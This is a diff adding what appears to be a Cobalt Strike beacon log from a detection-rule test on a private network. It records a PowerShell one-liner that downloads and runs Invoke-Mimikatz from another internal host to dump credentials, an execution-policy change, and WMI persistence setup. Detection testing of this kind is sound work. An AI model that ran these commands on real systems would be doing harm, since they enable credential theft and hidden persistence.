@@ -1,0 +1,54 @@
+02/24 09:41:45 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 18052; os: Windows; version: 6.1; beacon arch: x86 (x64)
+02/24 14:19:27 [task] 通过Powershell下载执行ps脚本，触发 1086_002 & 1086_004 两条规则
+02/24 14:19:27 [task] Tasked beacon to run: Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
+02/24 14:19:59 [checkin] host called home, sent: 355 bytes
+02/24 14:20:03 [output]
+received output:
+#< CLIXML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Set-ExecutionPolicy : Windows PowerShell 已成功更新您的执行策略，但该设置已被在_x000D__x000A_</S><S S="Error">更具体的范围内定义的策略覆盖。由于此覆盖，您的 shell 将保留自己的“Bypass”当前_x000D__x000A_</S><S S="Error">有效执行策略。键入“Get-ExecutionPolicy -List”可查看您的执行策略设置。有关详细_x000D__x000A_</S><S S="Error">信息，请参阅“Get-Help Set-ExecutionPolicy”。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ Set-ExecutionPolicy &lt;&lt;&lt;&lt;  RemoteSigned -Scope CurrentUser_x000D__x000A_</S><S S="Error">    + CategoryInfo          : PermissionDenied: (:) [Set-ExecutionPolicy], Sec _x000D__x000A_</S><S S="Error">   urityException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ExecutionPolicyOverride,Microsoft.PowerShell.Com _x000D__x000A_</S><S S="Error">   mands.SetExecutionPolicyCommand_x000D__x000A_</S></Objs>
+
+02/24 14:20:03 [output]
+received output:
+使用“1”个参数调用“DownloadString”时发生异常:“基础连接已经关闭: 发送时发生
+错误。”
+所在位置 行:1 字符: 46
++ IEX (New-Object Net.WebClient).DownloadString <<<< ('https://172.17.2.57:8080
+/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+ 
+无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请
+检查名称的拼写，如果包括路径，请确保路径正确，然后重试。
+所在位置 行:1 字符: 111
++ IEX (New-Object Net.WebClient).DownloadString('https://172.17.2.57:8080/Invok
+e-Mimikatz.ps1'); Invoke-Mimikatz <<<<  -DumpCreds
+    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], Com 
+   mandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+ 
+
+
+02/24 15:59:18 [task] 4*************进行WMI启动**********
+02/24 15:59:18 [task] 4*******请先提权*******
+02/24 15:59:18 [task] 4********WMI正在启动,测试后需删除**********
+02/24 16:20:23 [task] 4*************进行WMI启动**********
+02/24 16:20:23 [task] 启动WMI 
+02/24 16:20:23 [task] 4********WMI正在启动,测试后需删除**********
+02/24 16:21:09 [checkin] host called home, sent: 673 bytes
+02/24 16:21:14 [output]
+received output:
+Instance creation successful.
+
+
+02/24 16:21:14 [output]
+received output:
+ERROR:
+Description = Object or property already exists
+
+
+02/24 16:21:14 [output]
+received output:
+ERROR:
+Description = Object or property already exists
+
+
